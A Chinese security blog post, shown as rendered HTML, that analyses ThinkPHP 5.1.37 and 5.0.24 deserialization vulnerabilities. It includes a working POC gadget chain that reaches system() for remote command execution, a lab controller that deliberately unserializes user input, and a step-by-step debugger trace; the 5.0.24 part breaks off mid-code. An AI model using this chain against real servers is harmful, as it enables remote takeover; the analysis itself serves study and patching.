class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">haha</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">nihao</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;nihao&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">haha</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;aaa\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">nihao</span>();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20240117155837506.png" alt="image-20240117155837506"></p><p>就是说使用trait修饰类以后  我们可以使用use来在类里直接调用他  这样就可以进行类的复用了</p><p>这里讲一下这个 <code>trait</code>的特性  就是他这个只use的话  他里面的方法也是可以被调用到的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发了toString&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;bbbbb&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">b</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240117162158302.png" alt="image-20240117162158302"></p><p>这是个简单的例子</p><p><strong>(这个特性的话在外面接下来讲的这个thinkphp的反序列化链子会用)</strong></p><h1 id="Thinkphp-5-1-37"><a href="#Thinkphp-5-1-37" class="headerlink" title="Thinkphp-5.1.37"></a>Thinkphp-5.1.37</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://github.com/top-think/framework/releases/tag/v5.1.37">https://github.com/top-think/framework/releases/tag/v5.1.37</a></p><p><a href="https://github.com/top-think/framework/tree/5.1">https://github.com/top-think/framework/tree/5.1</a></p><p>php7.3.4+xdebuger+thinkphp-5.1.37+phpstorm</p><p>该反序列化漏洞属于二次触发漏洞，需要有一个入口，因此我们将控制器中的Index控制器修改一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//    public function index()</span></span><br><span class="line"><span class="comment">//    &#123;</span></span><br><span class="line"><span class="comment">//        return &#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V5.1&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;12载初心不改（2006-2018） - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;eab4b9f840753f8e7&quot;&gt;&lt;/think&gt;&#x27;;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    public function hello($name = &#x27;ThinkPHP5&#x27;)</span></span><br><span class="line"><span class="comment">//    &#123;</span></span><br><span class="line"><span class="comment">//        return &#x27;hello,&#x27; . $name;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"><span class="variable">$input</span>=<span class="string">&quot;&quot;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ThinkPHP5_Unserialize:\n&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$input</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V5.1&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;12载初心不改（2006-2018） - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;eab4b9f840753f8e7&quot;&gt;&lt;/think&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;ThinkPHP5&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello,&#x27;</span> . <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20240117163852265.png" alt="image-20240117163852265"></p><p>然后运行启动的样子是这样的话就成功了</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&quot;boogipop&quot;</span>=&gt;[<span class="string">&quot;calc.exe&quot;</span>,<span class="string">&quot;calc&quot;</span>]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;boogipop&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;boogipop&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>base64生成后直接传入</p><p><img src="../images/image-20240117164143176.png" alt="image-20240117164143176"></p><p>这里简单讲讲这个poc为啥是这样写的   namespace必须是得和源码一样的  然后在定义类的时候  使用的也必须是得和源码一样的  但是在给参数赋值的时候  我们可以<code>__construct()</code>来进行定义   因为这个参数是不进行反序列化的</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><img src="../images/image-20240117170110061.png" alt="image-20240117170110061"></p><p>在这个地方下个断点  然后开始分析就完事了</p><p><img src="../images/image-20240117171019123.png" alt="image-20240117171019123"></p><p>入口点是这个windows类的__destruct方法  我们接着跟进这个removeFiles方法</p><p><img src="../images/image-20240117171253674.png" alt="image-20240117171253674"></p><p>filename是我们在poc中传入的值  就是<code>think\model\Pivot</code>这个类  然后因为file_exists  那么就会调用到toString方法</p><p><img src="../images/image-20240117171516785.png" alt="image-20240117171516785"></p><p>这里的话就会进入到toString方法中  但是为什么是进入到Conversion这个类的toString方法中？？？</p><p>其实这里的原因就是刚刚在上面讲trait的时候讲到的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | ThinkPHP [ WE CAN DO IT JUST THINK ]</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | Copyright (c) 2006~2018 http://thinkphp.cn All rights reserved.</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | Author: liu21st &lt;liu21st@gmail.com&gt;</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> Model */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$autoWriteTimestamp</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 架构函数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  array|object  $data 数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  Model         $parent 上级模型</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string        $table 中间数据表名</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span> = [], Model <span class="variable">$parent</span> = <span class="literal">null</span>, <span class="variable">$table</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$this</span>-&gt;name)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;name = <span class="variable">$table</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们回到think\model\Pivot  这个类中  我们发现这个类中是没有<strong>toString方法的  但是这个类是继承于Model这个类  然而在pivot这个类中没有找到`</strong>toString`方法的时候  就会到父类中去寻找</p><p><img src="../images/image-20240117171953168.png" alt="image-20240117171953168"></p><p>然而父类中也是没有这个方法的   但是这个父类使用use调用了Conversion这个用trait修饰的类</p><p><img src="../images/image-20240117172105733.png" alt="image-20240117172105733"></p><p>所以就会去到这个类中寻找  </p><p><img src="../images/image-20240117172139099.png" alt="image-20240117172139099"></p><p>然后这样就会调用到了  (这里就和我们上面讲的trait修饰符的特殊之处对应上了)</p><p>这里借用boo师傅的一张图</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677459350948-dbb6cd39-8803-470a-b65d-3b9449673ba8.png#averageHue=%23fbfbfb&amp;clientId=u0e157718-5316-4&amp;from=paste&amp;height=324&amp;id=u2c18bb5b&amp;name=image.png&amp;originHeight=405&amp;originWidth=1118&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=35689&amp;status=done&amp;style=none&amp;taskId=u5d659110-d16c-49cf-90dc-c4a3ac0f2f2&amp;title=&amp;width=894.4" alt="image.png"></p><p><img src="../images/image-20240118100623108.png" alt="image-20240118100623108"></p><p>跟着进入这个toJson方法  然后接着跟进这个toArray方法</p><p><img src="../images/image-20240118100705471.png" alt="image-20240118100705471"></p><p>跟进toArray方法  </p><p><img src="../images/image-20240118100813573.png" alt="image-20240118100813573"></p><p>重点主要是toArray方法中的这三个方法  我们挨个跟进</p><p><img src="../images/image-20240118100951136.png" alt="image-20240118100951136"></p><p>在poc中 我们设置了这个key -value值 </p><p><img src="../images/image-20240118101056831.png" alt="image-20240118101056831"></p><p>所以这里的值就是boogipop的key值  因为这里key不为空  所以直接返回空</p><p><img src="../images/image-20240118101211331.png" alt="image-20240118101211331"></p><p>因为我们返回的key值为空   所以能进入if判断  所以进入到了这个getAttr的方法中</p><p><img src="../images/image-20240118101306812.png" alt="image-20240118101306812"></p><p>接着跟进这个getData方法中  看看里面是获取了什么东西</p><p><img src="../images/image-20240118101602279.png" alt="image-20240118101602279"></p><p>因为我们的参数名是boogipop 那么第一个if不满足条件  于是跳到了第二个if中  直接返回值</p><p><img src="../images/image-20240118101704892.png" alt="image-20240118101704892"></p><p>这里返回的Request对象  就是在我们刚刚poc中设置的对象</p><p><img src="../images/image-20240118101738321.png" alt="image-20240118101738321"></p><p>这就是在我们poc中设置的键值对了</p><p><img src="../images/image-20240118101914241.png" alt="image-20240118101914241"></p><p>因为$relation为我们刚刚获取到的request对象  因为request对象中没有visible这个方法  那么就会调用到__call魔术方法  </p><p><img src="../images/image-20240118102113131.png" alt="image-20240118102113131"></p><p><img src="../images/image-20240118102214428.png" alt="image-20240118102214428"></p><p><img src="../images/image-20240118102229712.png" alt="image-20240118102229712"></p><p>然后传进来的参数就变成了  我们刚刚设置的那个数组的键值对了</p><p>首先使用<code>array_shift</code>往之前的<code>[calc,calc.exe]</code>数组插入<code>$this</code>也就是<code>Request</code>对象，之后调用<code>call_user_func_array</code>方法，其中<code>$this-&gt;hook[$method]</code>就是<code>$this-&gt;hook[&#39;visible&#39;]</code>，在POC中为<code>isAjax</code>方法，跟进该方法：</p><p><img src="../images/image-20240118102611000.png" alt="image-20240118102611000"></p><p>然后我们接着跟进这个param方法</p><p><img src="../images/image-20240118102706685.png" alt="image-20240118102706685"></p><p>然后我们接着跟进这个input方法  这个方法的就是获取我们url输入的键值对</p><p><img src="../images/image-20240118102845013.png" alt="image-20240118102845013"></p><p>然后跟进这个getData方法  看看其能获取到什么东西</p><p><img src="../images/image-20240118102953982.png" alt="image-20240118102953982"></p><p>这个函数就是遍历我们传入的键值对  然后返回该结果  这里就将我们传入的whoami给获取到了</p><p><img src="../images/image-20240118103054878.png" alt="image-20240118103054878"></p><p>跟进这个getFilter方法  因为我们在poc初始化的时候给filter也赋值了</p><p><img src="../images/image-20240118103149054.png" alt="image-20240118103149054"></p><p>这里用个三目运算符来进行判断  如果filter传入为空的话就用我们的初始化值</p><p><img src="../images/image-20240118103253845.png" alt="image-20240118103253845"></p><p>在poc中的话也指定了这个filter的值 </p><p><img src="../images/image-20240118103350265.png" alt="image-20240118103350265"></p><p>然后将这个空值传入到这个filter数组中去  不过没有影响  后面会有函数将null给除去</p><p><img src="../images/image-20240118103509930.png" alt="image-20240118103509930"></p><p>然后我们接着跟进这个filterValue方法 </p><p><img src="../images/image-20240118103542067.png" alt="image-20240118103542067"></p><p>跟进之后  我们返回了这里会使用array_pop方法来将我们的filter数组的最后一个数给除去</p><p><img src="../images/image-20240118103644583.png" alt="image-20240118103644583"></p><p>然后最后我的call_user_func就会执行我们构造的恶意命令了  然后成功完成RCE</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677475246895-8468d7ef-81bc-4339-9793-cd52d5c34641.png#averageHue=%232c313d&amp;clientId=u0e157718-5316-4&amp;from=paste&amp;id=u705a915f&amp;name=image.png&amp;originHeight=886&amp;originWidth=1421&amp;originalType=url&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=333657&amp;status=done&amp;style=none&amp;taskId=udbeab041-29e1-4e3e-97e2-5d709d1b8a7&amp;title=" alt="image.png"></p><p>贴一张链子的完全图</p><h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>官方是把Request的__call方法给除去了  那么链子的后半段就完全断掉了</p><h1 id="Thinkphp-5-0-24"><a href="#Thinkphp-5-0-24" class="headerlink" title="Thinkphp-5.0.24"></a>Thinkphp-5.0.24</h1><p>在5.0.24和5.0.18可用，5.0.9不可用</p><h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://www.codejie.net/5913.html">https://www.codejie.net/5913.html</a></p><p>php7.3.4+xdebuger+thinkphp-5.0.24+phpstorm</p><p>该反序列化漏洞属于二次触发漏洞，需要有一个入口，因此我们将控制器中的Index控制器修改一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"><span class="variable">$input</span>=<span class="string">&quot;&quot;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ThinkPHP5_Unserialize:\n&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$input</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; .think_default_text&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt; ThinkPHP V5&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;十年磨一剑 - 为API开发设计的高性能框架&lt;/span&gt;&lt;/p&gt;&lt;span style=&quot;font-size:22px;&quot;&gt;[ V5.0 版本由 &lt;a href=&quot;http://www.qiniu.com&quot; target=&quot;qiniu&quot;&gt;七牛云&lt;/a&gt; 独家赞助发布 ]&lt;/span&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=9347272&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;ad_bd568ce7058a1091&quot;&gt;&lt;/think&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"><span class="variable">$name</span>=<span class="string">&quot;&quot;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20240118140117639.png" alt="image-20240118140117639"></p><p>然后这样就搭建完成了</p><h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 